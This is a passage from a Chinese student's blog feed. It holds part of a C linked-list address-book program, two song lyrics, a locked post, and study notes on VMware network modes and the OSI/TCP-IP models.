class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的住址：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.add));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(select == <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;请输入新的分组：&quot;</span>);</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(p-&gt;data.group));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;更新成功！\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在该 ID！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//八、查找记录（根据ID）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入需要查找的ID：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;ID);</span><br><span class="line">    <span class="keyword">while</span>(p &amp;&amp; <span class="built_in">strcmp</span>(p-&gt;data.ID,ID) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中不存在此人！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//九、打印输出所有记录  遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Printall_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p;</span><br><span class="line">    <span class="keyword">if</span>(L == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录是空的！\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = L-&gt;next;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;通讯录中的全部记录如下：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span>(p)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：%s\t&quot;</span>,p-&gt;data.ID);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>,p-&gt;data.name);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：%s\t&quot;</span>,p-&gt;data.sex);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：%s\t&quot;</span>,p-&gt;data.tele);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;住址：%s\t&quot;</span>,p-&gt;data.add);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：%s\t&quot;</span>,p-&gt;data.group);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            p = p-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//十、释放 链表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Destroy_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *p,*q;</span><br><span class="line">    p = L-&gt;next;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p;<span class="comment">//使用 q 暂时存放当前结点</span></span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(q);</span><br><span class="line">        q = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(p);</span><br><span class="line">    <span class="built_in">free</span>(L);</span><br><span class="line">    L = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;释放成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单界面</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Menu</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\t\t\t*********************简易通讯录*******************\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t1.初始化通讯录                          5.查找联系人\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t2.创建通讯录                      6.插入联系人\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t3.删除联系人                      7.遍历通讯录\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t4.修改联系人                      8.释放通讯录\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t\t\t********************* 0 为退出 *******************\n&quot;</span>);</span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> select;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;使用说明：为了您的正常使用，请按照顺序进行操作！！！\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;首先请初始化；随后请创建通讯录！！！之后可进行 删除、修改、查找、插入、遍历等操作；最后请释放通讯录！！\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">//system(&quot;cls&quot;);</span></span><br><span class="line">        Menu();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;请选择菜单：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">        <span class="keyword">switch</span>(select)&#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                &#123;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line">                    Init_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                &#123;</span><br><span class="line"><span class="comment">//创建通讯录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择创建方式(1.前插法 2.尾插法)：&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Creat_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Creat_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//删除记录</span></span><br><span class="line">                    Dele_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//修改记录</span></span><br><span class="line">                    Update_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//查找记录</span></span><br><span class="line">                    Find_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//插入记录</span></span><br><span class="line">                    <span class="keyword">int</span> num;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;请选择插入方式(1.前插法 2.尾插法)&quot;</span>);</span><br><span class="line">                    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">1</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//前插法</span></span><br><span class="line">                        Insert_List_front();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(num == <span class="number">2</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">//尾插法</span></span><br><span class="line">                        Insert_List_behind();</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//遍历</span></span><br><span class="line">                    Printall_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">//释放</span></span><br><span class="line">                    Destroy_List();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/15/KdJ6nYGcFESbrhP.png" alt="image-20211015165430030"></p><p><img src="https://i.loli.net/2021/10/15/plQ1m5XRcCDOtHJ.png" alt="image-20211015165636809"></p><p><img src="https://i.loli.net/2021/10/15/6lhzZMNEI3XYrP9.png" alt="image-20211015165510697"></p><p><img src="https://i.loli.net/2021/10/15/Ubm6uEakfOZnTV3.png" alt="image-20211015165608348"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>呓语</title>
    <link href="https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/"/>
    <id>https://xizhi-future.github.io/2021/10/10/%E5%91%93%E8%AF%AD/</id>
    <published>2021-10-10T08:46:24.000Z</published>
    <updated>2021-10-10T09:07:35.393Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 毛不易</p><p>作曲 : 毛不易</p><p>一段未醒</p><p>又做一段</p><p>如果这画面有开关</p><p>从期待走到不堪</p><p>结局不好看</p><p>人总需要记住遗憾</p><p>它来过 它走了</p><p>没回头 没问过</p><p>你可舍得</p><p>日月蹉跎</p><p>小起大落</p><p>光阴里有多少景色</p><p>偶尔也心口一热</p><p>什么都不说</p><p>好过亲手把它撕破</p><p>路还长 梦还多</p><p>被这话 欺骗的</p><p>何止你我</p><p>可是我现在依然不太会转弯</p><p>虽然孤单的人偶尔也想有个伴</p><p>冷风又吹的时候想说</p><p>这生活会不会有点难</p><p>难道是因为当初有话没讲完</p><p>堵在喉咙里却始终不敢大声喊</p><p>算了 别哭</p><p>日月蹉跎</p><p>小起大落</p><p>光阴里有多少景色</p><p>偶尔也心口一热</p><p>什么都不说</p><p>好过亲手把它撕破</p><p>路还长 梦还多（不多）</p><p>被这话 欺骗的</p><p>何止你我</p><p>可是我现在依然不太会转弯</p><p>虽然孤单的人偶尔也想有个伴</p><p>冷风又吹的时候想说</p><p>这生活会不会有点难</p><p>难道是因为当初有话没讲完</p><p>堵在喉咙里却始终不敢大声喊</p><p>算了 别哭</p><p>可是我偏偏就是不想要转弯</p><p>就算不开灯的房间真的有些暗</p><p>夜色又来的时候想说</p><p>为什么只留给我一半</p><p>难道是因为出现的人都伪善</p><p>擅长告别擅长躲闪擅长分两端</p><p>算了 别哭</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>保留</title>
    <link href="https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/"/>
    <id>https://xizhi-future.github.io/2021/10/10/%E4%BF%9D%E7%95%99/</id>
    <published>2021-10-10T08:44:00.000Z</published>
    <updated>2021-10-10T08:45:51.039Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>作词 : 郭顶</p><p>作曲 : 郭顶</p><p>看见 你在我眼前</p><p>不去猜想我们隔多远</p><p>当我 夜幕中准备</p><p>只想让沉默的能开解</p><p>在不同的遭遇里我发现你的瞬间</p><p>有种不可言说的温柔直觉</p><p>在有限的深夜消失之前触摸你的脸</p><p>我情愿这是幻觉 也不愿是种告别</p><p>已经忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>被保留</p><p>给我 一整个拥抱</p><p>好让我不至于 太潦倒</p><p>时间 过一分一秒</p><p>还是觉得相遇 太美好</p><p>在不同的遭遇里我发现你的瞬间</p><p>有种不可言说的温柔直觉</p><p>当不远的蓝色渐渐显现这无边境界</p><p>我始终等待再见 只不愿再也不见</p><p>已经忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>想形容你的句子 关于你所有心事</p><p>一眼能及的钻石 哪一个是你地址</p><p>忘了 你的名字</p><p>就在这座 寂静星石</p><p>怎么还有 你的样子</p><p>我始终等待再见 只不愿再也不见</p><p>真的忘了 你的名字</p><p>是在哪座 寂静星石</p><p>一直还有 你的样子</p><p>被保留</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>雨天心事</title>
    <link href="https://xizhi-future.github.io/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/"/>
    <id>https://xizhi-future.github.io/2021/10/09/%E9%9B%A8%E5%A4%A9%E5%BF%83%E4%BA%8B/</id>
    <published>2021-10-09T03:36:22.000Z</published>
    <updated>2021-10-09T04:17:23.453Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="94ca14958087636ac0d05246e2f08cdc77fbac705e80a44b4b290d7e348a4393"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">只给知心的人分享，请在输入密码方可阅读！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Welcome to my blog, enter password to read</summary>
    
    
    
    <category term="生活杂谈" scheme="https://xizhi-future.github.io/categories/%E7%94%9F%E6%B4%BB%E6%9D%82%E8%B0%88/"/>
    
    
  </entry>
  
  <entry>
    <title>虚拟机的网络设置</title>
    <link href="https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/"/>
    <id>https://xizhi-future.github.io/2021/10/08/%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9A%84%E7%BD%91%E7%BB%9C%E8%AE%BE%E7%BD%AE/</id>
    <published>2021-10-08T13:12:52.000Z</published>
    <updated>2021-10-08T13:13:15.379Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="虚拟机的网络设置"><a href="#虚拟机的网络设置" class="headerlink" title="虚拟机的网络设置"></a>虚拟机的网络设置</h1><p>VMware三种网络设置：Bridged桥接，NET网络地址转换模式，Host-Only仅主机模式</p><p>当下载软件之后，我们的真实机上将会多出一些虚拟网卡，用于 虚拟机网络的配置</p><p><img src="https://i.loli.net/2021/10/08/RIh78Fy2A4GpOVr.png" alt="image-20211008210437678"></p><blockquote><ul><li><strong>VMnet0</strong> ：用于 Bridged 桥接模式</li><li><strong>VMnet8</strong> ：用于 NET 模式</li><li><strong>VMnet1</strong> ：用于 Host-Only 模式</li></ul></blockquote><p><img src="https://i.loli.net/2021/10/08/NnEDgAUpr5cLC4f.png" alt="image-20211008201312486"></p><ul><li><p>可以看到存在 三个 VMnet0   VMnet1  VMnet8</p></li><li><p>这些是 VMware Workstation 软件 自带的，可以进行设置，可以进行删除，它们相当于 是三个交换机。</p></li><li><p><strong>VMnet0</strong> ：如果将一个虚拟机设置为连接在 该交换机上，则相当于 将其 当作一个 真实的物理机 一样连接在你 真实机的所处的网段 当中。</p></li></ul><blockquote><p><strong>测试：设置 Windows 7 接在 VMnet0 上</strong></p></blockquote><p><img src="https://i.loli.net/2021/10/08/3U4jLEX6GvbKNgr.png" alt="image-20211008201924965"></p><p>我们设置为 自动获得 IP 地址，然后查看其网络连接的详细信息，可以看到与我们真实的物理机所处的网段相同。</p><p><img src="https://i.loli.net/2021/10/08/zReG8n63lvoM7Ni.png" alt="image-20211008202237411"></p><blockquote><p>使用 真实机 ping 192.168.4.234</p><p>实际上，只要是处于该网段中的任意一台计算机都可以 ping 通 我们所设置的 虚拟机</p></blockquote><p>当中可能出现的错误：解决办法 （注意：需要使用 管理员方式运行；关闭要ping 的主机的防火墙）</p><p><img src="https://i.loli.net/2021/10/08/vJOUVGj97s4ip6F.png" alt="image-20211008203642130"></p><p><img src="https://i.loli.net/2021/10/08/3unJasAW6EZprLj.png" alt="image-20211008204622495"></p><ul><li>当不需要与外网进行通信，也就是平时我们 仅仅搭建一个小型局域网的 测试，只需要我们的几个虚拟机之间进行通信，我们就不用使用 VMnet0 ，可以使用 其他的交换机或者是 使用 Host-Only</li><li>**NET **：通过真实机 上网，存在一个地址转换，只要是真实机所能访问的所有网络，虚拟机均可</li><li><strong>Host-Only</strong> ：仅主句模式，仅仅能与 真实机 进行通信</li></ul><blockquote><p><strong>补充：</strong></p><p><strong>169.254.X.X</strong></p><p>是Windows操作系统在DHCP信息租用失败时自动给客户机分配的IP地址。但是是无法与网关通信的，也无法接入Internet的情况。</p></blockquote><p><a href="https://www.cnblogs.com/cnjavahome/p/11266931.html">虚拟机网络设置 参考</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="虚拟机" scheme="https://xizhi-future.github.io/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>1.7 计算机网络的体系结构</title>
    <link href="https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <id>https://xizhi-future.github.io/2021/10/08/1.7-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9A%84%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</id>
    <published>2021-10-08T12:01:19.000Z</published>
    <updated>2021-10-08T12:02:38.238Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-7-计算机网络的体系结构"><a href="#1-7-计算机网络的体系结构" class="headerlink" title="1.7 计算机网络的体系结构"></a>1.7 计算机网络的体系结构</h1><ul><li>ISO 国际标准化组织</li><li>OSI / RM  互连网法律上的国际标准</li><li>TCP / IP 因特网事实上的国际标准</li><li>网络协议  Network Protocols   数据交换存寿的规则、标准与约定</li><li>网络体系结构  计算机网络各层及其协议的集合</li></ul><h2 id="1-7-1-OSI-七层模型"><a href="#1-7-1-OSI-七层模型" class="headerlink" title="1.7.1 OSI 七层模型"></a>1.7.1 OSI 七层模型</h2><p><strong>开放式系统互联通信参考模型</strong>（英语：Open System Interconnection Reference Model，缩写为 OSI），简称为  <em>OSI模型</em>（OSI model），一种 <em>概念模型</em>，由 <em>国际标准化组织</em> 提出，一个试图使各种计算机在世界范围内互连为网络的标准框架。</p><p><strong>应用层</strong>：可以产生流量，可以与用户进行交互的应用程序</p><p><strong>表示层</strong>：是否加密？ 是否压缩？  编码问题？  开发人员需要考虑的问题</p><p><strong>会话层</strong>：服务端与客户端建立的会话   可查看木马：<code>netstat -nb </code></p><p>​    例如：远程桌面建立会话</p><blockquote><p>192.168.158.1   远程连接    192.168.158.115</p></blockquote><ul><li><p>对 192.168.158.115 进行端口查看，可以看到 存在远程桌面的会话</p><p><code>netstat -an</code></p></li></ul><p><img src="https://i.loli.net/2021/10/07/hFeXnqdbw1MSTNI.png" alt="image-20211007175448711"></p><ul><li><p>进一步 进行 “木马” 查看：</p><p><code>netstat -nb</code></p></li></ul><p><img src="https://i.loli.net/2021/10/07/eYxl8Gr1UKgtuho.png" alt="image-20211007175644564"></p><p>例：当想查看当前计算机中是否存在木马，可以打开电脑，不进行任何操作，即无流量传输，后 命令 <code>netstat -nb</code>  ，查看进程。</p><p><strong>传输层：</strong>可靠传输（建立会话），不可靠传输（不建立会话），流量控制</p><p><strong>网络层：</strong>IP地址编址，选择最佳路径（动态路由协议）</p><p><strong>数据链路层：</strong>规定数据如何封装，添加物理层地址（MAC 地址）</p><p><strong>物理层：</strong>电压、接口标准</p><blockquote><p><strong>应用举例：</strong></p><p>​    <strong>网络排错</strong>：分层检查：从最底层开始向上逐一排查</p><pre><code>1. 网线是否插好？（物理层）2.  IP地址 检查 （网络层）3. 浏览器 恶意插件？（应用层）</code></pre><p>终极：重装，重启，格式化</p></blockquote><blockquote><p><strong>网络安全与 OSI 参考模型</strong></p><ol><li>物理层安全     设置 <em>交换机</em> 某接口禁止 外来用户 的连接</li><li>数据链路层安全   ADSL、AP密码</li><li>网络层安全    设置 <em>路由器</em> 某接口 禁止外来用户 的连接</li><li>应用层安全      SQL注入、文件上传、文件包含等等 应用层漏洞、各种攻击手段等</li></ol></blockquote><h2 id="1-7-2-TCP-IP-四层模型"><a href="#1-7-2-TCP-IP-四层模型" class="headerlink" title="1.7.2 TCP/IP 四层模型"></a>1.7.2 TCP/IP 四层模型</h2><p><strong>应用层</strong>   （包括了 表示层、会话层）</p><p><strong>传输层</strong></p><p><strong>网络层</strong></p><p>**网络接口层 **  （包括了 数据链路层、物理层）</p><h2 id="1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程"><a href="#1-7-3-五层协议-对应-数据单元-以及-数据简单-运输过程" class="headerlink" title="1.7.3 五层协议  对应 数据单元  以及 数据简单 运输过程"></a>1.7.3 五层协议  对应 <code>数据单元</code>  以及 <code>数据简单 运输过程</code></h2><p><strong>应用层</strong>             传输数据单元：PDU</p><p>**传输层    **         运输层 报文   <code>加 TCP/UDP</code></p><p><strong>网络层</strong>             IP 数据包 （IP 分组）  <code>加 IP 地址</code></p><p><strong>数据链路层</strong>      数据帧   <code>加 MAC 地址，加帧头帧尾 </code> </p><p><strong>物理层</strong>              比特流  bit  (01构成)    </p><p><img src="https://i.loli.net/2021/10/08/h5k2MJC7V6KS3wb.png" alt="image-20211008194422314"></p><p> <img src="https://i.loli.net/2021/10/08/bfYMdNl1crxivny.png" alt="image-20211008194507335"></p><h2 id="1-7-4-基本概念"><a href="#1-7-4-基本概念" class="headerlink" title="1.7.4 基本概念"></a>1.7.4 基本概念</h2><p><strong>实体 entity</strong> ：交换信息或软件进程</p><p><strong>协议 protocol</strong> ：控制两个对等实体通信的规则</p><p><strong>服务 service</strong> ：下层向上层提供服务，上层需要使用下层提供的服务来实现本层的功能</p><p><strong>服务访问点 SAP</strong> ：相邻两层实体之间交换信息的地方</p><p><img src="https://i.loli.net/2021/10/08/RexqQ58rS27CJ19.png" alt="image-20211008193707527"></p><h2 id="1-7-5-实操"><a href="#1-7-5-实操" class="headerlink" title="1.7.5 实操"></a>1.7.5 实操</h2><p><strong>查看本地网络连接网速：</strong></p><blockquote><p>测试：windows 7 </p></blockquote><p><img src="https://i.loli.net/2021/10/08/EOCmnvh81937pGQ.png" alt="image-20211008195814866"></p><p>自动协商是根据双方速率进行自动设置，如果强制设置为与另一方速率不匹配的网速，则无法正常进行通信。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/categories/%E8%AE%A1%E7%BD%91/"/>
    
    
    <category term="计网" scheme="https://xizhi-future.github.io/tags/%E8%AE%A1%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>序列化与反序列化</title>
    <link href="https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://xizhi-future.github.io/2021/10/07/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-10-07T10:10:26.000Z</published>
    <updated>2021-10-07T10:11:19.031Z</updated>
    
